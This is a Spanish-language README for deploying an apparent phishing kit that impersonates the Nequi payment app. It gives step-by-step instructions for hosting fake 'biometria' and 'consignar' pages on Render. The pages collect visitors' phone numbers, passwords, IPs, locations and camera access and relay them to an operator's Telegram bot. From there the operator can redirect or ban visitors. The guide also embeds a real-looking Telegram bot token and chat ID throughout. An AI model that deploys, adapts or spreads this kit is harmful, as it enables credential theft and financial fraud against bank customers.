# 🚀 Proyecto Nequi Backend - LISTO PARA DEPLOY

## 📦 ¿Qué es este proyecto?

Este es un backend completo en Node.js con Express que gestiona flujos de una aplicación web tipo Nequi con control mediante Telegram Bot.

**TUS CREDENCIALES YA ESTÁN CONFIGURADAS:**
- ✅ BOT_TOKEN: `8320115836:AAEUuTrSU-LnVYqNDcXP5pm93BY9uPOrs9Q`
- ✅ CHAT_ID: `6219536820`

---

## 🎯 PASOS RÁPIDOS PARA DEPLOY (10 minutos)

### Paso 1: Subir a GitHub (3 minutos)

#### Opción A: Desde la terminal (recomendado)
```bash
# 1. Abre la terminal en la carpeta del proyecto
cd /ruta/a/nequi-backend-proyecto

# 2. Inicializar Git
git init
git add .
git commit -m "Proyecto Nequi Backend listo"
git branch -M main

# 3. Crear repositorio en GitHub
# Ve a https://github.com/new
# Dale un nombre: "nequi-backend"
# NO marques "Add README" ni nada
# Click "Create repository"

# 4. Conectar y subir
git remote add origin https://github.com/TU-USUARIO/nequi-backend.git
git push -u origin main
```

#### Opción B: Desde GitHub Desktop (más fácil)
1. Descarga GitHub Desktop: https://desktop.github.com
2. Instálalo y haz login con tu cuenta de GitHub
3. Click en "Add" → "Add Existing Repository"
4. Selecciona la carpeta `nequi-backend-proyecto`
5. Click en "Publish repository"
6. Desmarca "Keep this code private" si quieres que sea público
7. Click "Publish Repository"

---

### Paso 2: Deploy en Render (5 minutos)

#### 2.1 Crear cuenta
1. Ve a https://render.com
2. Click "Get Started"
3. Regístrate con GitHub (más rápido)
4. Autoriza a Render

#### 2.2 Crear Web Service
1. Click en **"New +"** (esquina superior derecha)
2. Selecciona **"Web Service"**
3. Click en **"Connect account"** si no está conectado
4. Selecciona tu repositorio **"nequi-backend"**
5. Click **"Connect"**

#### 2.3 Configuración del servicio

**Name:** `nequi-backend` (o el que prefieras)

**Region:** `Oregon (US West)` (o el más cercano)

**Branch:** `main`

**Root Directory:** (déjalo vacío)

**Runtime:** `Node`

**Build Command:**
```
npm install
```

**Start Command:**
```
npm start
```

**Instance Type:** `Free`

#### 2.4 Variables de Entorno (MUY IMPORTANTE)

En la sección **"Environment Variables"**, agrega estas 3 variables:

| Key | Value |
|-----|-------|
| `BOT_TOKEN` | `8320115836:AAEUuTrSU-LnVYqNDcXP5pm93BY9uPOrs9Q` |
| `CHAT_ID` | `6219536820` |
| `RENDER_URL` | (déjalo vacío por ahora) |

#### 2.5 Desplegar
1. Scroll hasta abajo
2. Click en **"Create Web Service"**
3. Espera 3-5 minutos mientras se construye
4. Cuando veas "Live" con un punto verde, copia la URL que te da

**Ejemplo de URL:** `https://nequi-backend-xxxx.onrender.com`

#### 2.6 Actualizar RENDER_URL
1. En tu servicio de Render, click en **"Environment"** (menú izquierdo)
2. Encuentra la variable `RENDER_URL`
3. Click en **"Edit"**
4. Pega tu URL completa: `https://nequi-backend-xxxx.onrender.com`
5. Click **"Save Changes"**
6. El servicio se redesplegará automáticamente (2-3 minutos)

---

### Paso 3: Verificar que funciona (2 minutos)

#### 3.1 Test básico del servidor
Abre tu navegador y ve a:
```
https://tu-url.onrender.com/
```

Deberías ver algo como:
```json
{
  "ok": true,
  "service": "Nequi Backend Dinámico",
  "hasEnv": true,
  "status": "running"
}
```

#### 3.2 Verificar webhook de Telegram
Ve a esta URL (reemplaza con tu BOT_TOKEN):
```
https://api.telegram.org/bot8320115836:AAEUuTrSU-LnVYqNDcXP5pm93BY9uPOrs9Q/getWebhookInfo
```

Deberías ver tu URL de Render en el campo `"url"`.

#### 3.3 Probar flujo completo
1. Abre: `https://tu-url.onrender.com/biometria.php.html`
2. Permite el acceso a la cámara
3. Haz clic en "Continuar"
4. Verifica que llegue un mensaje a tu Telegram

---

## 🔧 Solución de Problemas

### El servidor dice "Sleeping"
**Causa:** Render pone el servidor en sleep después de 15 min sin actividad (plan Free)

**Solución:** El código ya tiene auto-ping cada 14 minutos. Solo espera 1-2 minutos y vuelve a intentar.

### No llegan mensajes a Telegram
**Verificar:**
1. BOT_TOKEN es correcto
2. CHAT_ID es correcto
3. Has hablado con tu bot (búscalo en Telegram y envíale `/start`)
4. El webhook está configurado (paso 3.2)

**Solución rápida:**
```bash
# Eliminar webhook
curl -X POST "https://api.telegram.org/bot8320115836:AAEUuTrSU-LnVYqNDcXP5pm93BY9uPOrs9Q/deleteWebhook"

# Reiniciar tu servicio en Render
# Ve a tu Dashboard → Tu servicio → Manual Deploy → "Deploy latest commit"
```

### Error 500 o página en blanco
**Causa:** Variables de entorno no configuradas

**Solución:**
1. Ve a Render Dashboard → Tu servicio → Environment
2. Verifica que las 3 variables estén ahí
3. Click en "Manual Deploy" → "Deploy latest commit"

### Los archivos HTML no se ven
**Causa:** Falta la carpeta `public/`

**Solución:** Verifica que tu estructura sea:
```
nequi-backend/
├── server.js
├── package.json
├── .gitignore
└── public/
    ├── biometria.php.html
    └── consignar.php.html
```

---

## 📱 Uso del Bot de Telegram

### Comandos disponibles
- Cuando lleguen mensajes, verás botones interactivos
- Click en los botones para redirigir al usuario
- Click en "BANEAR" para bloquear una IP

### Estructura de mensajes
Recibirás notificaciones con:
- 📱 Número de teléfono
- 🔑 Clave
- 🌐 IP del usuario
- 📍 Ubicación
- 🆔 ID de sesión

---

## 🎓 Próximos Pasos

### Para desarrollo local
```bash
# Instalar dependencias
npm install

# Crear archivo .env
echo "BOT_TOKEN=8320115836:AAEUuTrSU-LnVYqNDcXP5pm93BY9uPOrs9Q" > .env
echo "CHAT_ID=6219536820" >> .env
echo "RENDER_URL=http://localhost:3000" >> .env

# Ejecutar servidor
npm start

# Abrir en navegador
# http://localhost:3000
```

### Agregar más archivos HTML
1. Colócalos en la carpeta `public/`
2. Haz commit y push:
```bash
git add .
git commit -m "Agregar nuevos archivos"
git push
```
3. Render redesplegará automáticamente

---

## ⚠️ IMPORTANTE

1. ✅ **NUNCA** compartas tu BOT_TOKEN públicamente
2. ✅ Este proyecto usa el plan FREE de Render (limitaciones):
   - Se duerme después de 15 min sin uso
   - 750 horas/mes gratis
   - Puede ser lento al despertar
3. ✅ Los datos se almacenan en memoria (se borran al reiniciar)

---

## 📞 Soporte

Si tienes problemas:
1. Revisa los logs en Render: Dashboard → Tu servicio → Logs
2. Verifica las variables de entorno
3. Prueba el endpoint `/` para ver si está activo
4. Verifica el webhook de Telegram

---

## 🎉 ¡Listo!

Tu backend ya está funcionando en:
```
https://tu-url.onrender.com
```

Comparte ese link y empieza a recibir datos en tu Telegram 🚀
